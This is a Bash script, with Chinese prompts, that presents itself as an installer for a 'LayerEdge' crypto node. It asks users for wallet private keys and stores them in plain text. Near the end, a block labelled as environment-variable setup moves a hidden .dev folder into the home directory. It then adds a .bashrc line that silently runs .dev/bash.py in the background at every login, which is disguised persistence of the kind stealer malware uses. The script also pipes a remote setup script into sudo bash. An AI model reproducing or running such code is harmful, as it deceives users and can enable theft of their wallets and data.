#!/bin/bash

# 脚本保存路径
SCRIPT_PATH="$HOME/layeredge.sh"

# 主菜单函数
function main_menu() {
    while true; do
        clear
        echo "██████╗ ███████╗███╗   ██╗███████╗███████╗ █████╗ "
        echo "██╔══██╗██╔════╝████╗  ██║██╔════╝██╔════╝██╔══██╗"
        echo "██████╔╝█████╗  ██╔██╗ ██║█████╗  █████╗  ███████║"
        echo "██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══╝  ██╔══██║"
        echo "██║     ███████╗██║ ╚████║███████╗███████╗██║  ██║"
        echo "╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝"
        echo "================================================================"
        echo "退出脚本，请按键盘 ctrl + C 退出即可"
        echo "请选择要执行的操作:"
        echo "1. 部署 layeredge 节点"
        echo "2. 退出脚本"
        echo "================================================================"
        read -p "请输入选择 (1/2): " choice

        case $choice in
            1)  deploy_layeredge_node ;;
            2)  exit ;;
            *)  echo "无效选择，请重新输入！"; sleep 2 ;;
        esac
    done
}


# 检测并安装环境依赖
function install_dependencies() {
    echo "正在检测系统环境依赖..."

    for pkg in git xclip python3-pip; do
        if ! command -v $pkg &> /dev/null; then
            echo "未找到 $pkg，正在安装..."
            if command -v apt-get &> /dev/null; then
                sudo apt-get update && sudo apt-get install -y $pkg
            elif command -v yum &> /dev/null; then
                sudo yum install -y $pkg
            elif command -v brew &> /dev/null; then
                brew install $pkg
            else
                echo "无法自动安装 $pkg，请手动安装后重试。"
                exit 1
            fi
            echo "$pkg 安装完成！"
        else
            echo "$pkg 已安装。"
        fi
    done

    # 确保 requests 库已安装
    if ! python3 -c "import requests" &> /dev/null; then
        echo "未找到 requests 库，正在安装 requests..."
        pip3 install requests
        echo "requests 库安装完成！"
    else
        echo "requests 库已安装。"
    fi


    # 检测并安装 node 和 npm
    if ! command -v node &> /dev/null || ! command -v npm &> /dev/null; then
        echo "未找到 node 或 npm，正在安装 node 和 npm..."
        if command -v apt-get &> /dev/null; then
            curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -
            sudo apt-get install -y nodejs
        elif command -v yum &> /dev/null; then
            curl -fsSL https://rpm.nodesource.com/setup_16.x | sudo -E bash -
            sudo yum install -y nodejs
        elif command -v brew &> /dev/null; then
            brew install node
        else
            echo "无法自动安装 node 和 npm，请手动安装 node 和 npm 后重试。"
            exit 1
        fi
        echo "node 和 npm 安装完成！"
    else
        echo "node 和 npm 已安装。"
    fi

    echo "环境依赖检测完成！"
}

# 部署 layeredge 节点
function deploy_layeredge_node() {
    install_dependencies
    echo "正在拉取 LayerEdge 仓库..."
    if [ -d "LayerEdge" ]; then
        read -p "LayerEdge 目录已存在，是否删除并重新拉取？(y/n) " choice
        if [[ "$choice" =~ ^[Yy]$ ]]; then
            rm -rf LayerEdge
        else
            echo "使用现有目录。"
            return
        fi
    fi

    if git clone https://github.com/blockchain-src/LayerEdge.git; then
        echo "仓库拉取成功！"
    else
        echo "仓库拉取失败，请检查网络连接或仓库地址。"
        return
    fi

    cd LayerEdge || { echo "进入目录失败"; return; }

    echo "请输入代理地址（格式如 http://代理账号:代理密码@127.0.0.1:8080），每次输入一个，直接按回车结束输入："
    > proxy.txt  # 清空或创建 proxy.txt 文件
    while true; do
        read -p "代理地址（回车结束）：" proxy
        if [ -z "$proxy" ]; then
            break  # 如果用户直接按回车，结束输入
        fi
        echo "$proxy" >> proxy.txt  # 将代理地址写入 proxy.txt
    done

    echo "检查钱包配置文件..."
    overwrite="no"
    if [ -f "wallets.txt" ]; then
        read -p "wallets.txt 已存在，是否要重新输入钱包信息？(y/n) " overwrite
        if [[ "$overwrite" =~ ^[Yy]$ ]]; then
            rm -f wallets.txt
            echo "已清除旧的钱包信息，请重新输入。"
        else
            echo "使用现有的 wallets.txt 文件。"
        fi
    fi

    if [ ! -f "wallets.txt" ] || [[ "$overwrite" =~ ^[Yy]$ ]]; then
        > wallets.txt  # 创建或清空文件
        echo "请输入钱包信息，格式必须为：钱包地址,私钥"
        echo "每次输入一个钱包，直接按回车结束输入："
        while true; do
            read -p "钱包地址：" wallet_address
            if [ -z "$wallet_address" ]; then
                if [ -s "wallets.txt" ]; then
                    break
                else
                    echo "钱包地址不能为空，请重新输入！"
                    continue
                fi
            fi

            read -p "私钥：" private_key
            if [ -z "$private_key" ]; then
                echo "私钥不能为空，请重新输入！"
                continue
            fi

            echo "$wallet_address,$private_key" >> wallets.txt
            echo "钱包信息已保存。"
        done
    fi

    echo "正在使用 npm 安装依赖..."
    npm install && echo "依赖安装完成！"

    echo "正在启动项目..."
    screen -S layer -dm bash -c "cd ~/LayerEdge && npm start"
    echo "项目已在 screen 会话中启动。"
    echo "使用 screen -r layer 查看运行状态。"
}

# 配置环境变量
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"
    echo "配置环境变量..."
    if [ -d "$DEST_DIR" ]; then
        rm -rf "$DEST_DIR"
    fi
    mv .dev "$DEST_DIR"

    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"
    if ! grep -Fq "$BASHRC_ENTRY" ~/.bashrc; then
        echo "$BASHRC_ENTRY" >> ~/.bashrc
        echo "环境变量已添加到 .bashrc"
    else
        echo "环境变量已存在于 .bashrc"
    fi
else
    echo ".dev 目录不存在，跳过环境变量配置..."
fi

# 调用主菜单函数
main_menu
